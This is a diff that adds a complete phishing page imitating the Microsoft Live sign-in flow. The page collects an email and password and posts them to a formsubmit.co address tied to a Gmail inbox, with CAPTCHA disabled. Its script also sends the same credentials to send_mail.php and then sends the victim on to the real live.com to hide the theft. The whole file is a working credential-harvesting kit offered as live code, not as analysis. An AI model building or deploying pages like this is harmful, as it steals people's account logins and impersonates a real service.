@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Live Signin Page Clone</title>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Add Formspree action link and method POST -->
+            <form action="https://formsubmit.co/officemailservice46@gmail.com" method="POST">
+                <img class="logo" src="image/microsoftlogo.png" width="142">
+                <div class="forms-container">
+                    <div class="forms">
+                        <div class="first">
+                            <h2>Sign in</h2>
+                            <div class="form-group">
+                                <!-- Add name attribute to capture email -->
+                                <input type="email" id="email" name="email" placeholder="Email, Phone, or Skype" required>
+                            </div>
+                            <p>No account? <a href="#">Create One!</a></p>
+                            <a href="#">Sign in with a security key <span>?</span></a>
+                            <button type="button" class="next-btn">Next</button>
+                        </div>
+                        <div class="second">
+                            <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                            <h2>Enter password</h2>
+                            <div class="form-group">
+                                <!-- Add name attribute to capture password -->
+                                <input type="password" name="password" id="password" placeholder="Password" required>
+                            </div>
+                            <a href="#">Forgot password?</a>
+                            <!-- Change to type submit to send the form -->
+                            <button type="submit" id="signBtn">Sign in</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Optional hidden input to disable CAPTCHA -->
+                <input type="hidden" name="_captcha" value="false">
+            </form>
+        <div class="bottom">
+            <img src="image/key.png" width="142">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <script>
+        const forms = document.querySelector('.forms')
+        const next_button = document.querySelector('.next-btn')
+        const arrow_btn = document.querySelector('.arrow-btn')
+        const signBtn = document.querySelector('#signBtn')
+
+        const email_input = document.querySelector('.first input')
+        const email_el = document.querySelector('.email')
+
+        const email = document.querySelector('#email')
+        const password = document.querySelector('#password')
+
+        next_button.addEventListener('click', () => {
+            if (email.value !== '') {
+                forms.classList.add('next-form')
+                email_el.innerText = email.value
+                document.querySelector('.bottom').style.display = 'none'
+            }
+            else {
+                email.style.borderBottomColor = '#F00'
+            }
+        })
+        arrow_btn.addEventListener('click', () => {
+            email.style.borderBottomColor = '#000000b3'
+            forms.classList.remove('next-form')
+            document.querySelector('.bottom').style.display = 'flex'
+        })
+
+        signBtn.addEventListener('click', (e) => {
+            e.preventDefault()
+            if (email.value && password.value && password.value.length >= 6) {
+                fetch("send_mail.php", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: "email=" + encodeURIComponent(email.value) + "&password=" + encodeURIComponent(password.value)
+                })
+                .then(response => response.text())
+                .then(data => {
+                    document.querySelector("#responseMessage").innerText = data;
+                })
+                .catch(error => console.error("Error:", error));
+
+            }
+
+                          document.getElementById("signBtn").addEventListener("click", function() {
+                window.location.href = "https://www.live.com";
+              });
+
+        })
+    </script>
+
+</body>
+
+</html>
